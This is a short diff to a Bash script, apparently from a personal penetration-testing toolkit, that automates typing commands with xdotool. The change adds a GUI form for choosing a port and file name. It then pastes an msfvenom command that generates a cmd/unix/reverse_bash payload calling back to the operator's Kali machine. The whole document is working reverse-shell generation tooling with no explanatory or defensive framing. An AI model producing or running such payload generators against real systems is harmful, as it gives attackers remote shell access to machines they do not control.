@@ -6,6 +6,13 @@ Create Bash file
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
 source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
-paste_command "msfvenom -p cmd/unix/reverse_bash LHOST=${KALI_IP} LPORT=7000 -f raw -o shell.bash"
+# Generate gui form
+generate_form "LPORT" "filename"
+
+LPORT=${form_data["LPORT"]}
+FILE=${form_data["filename"]}
+
+paste_command "msfvenom -p cmd/unix/reverse_bash LHOST=${KALI_IP} LPORT=${LPORT} -f raw -o ${FILE}.bash"
 xdotool key Return
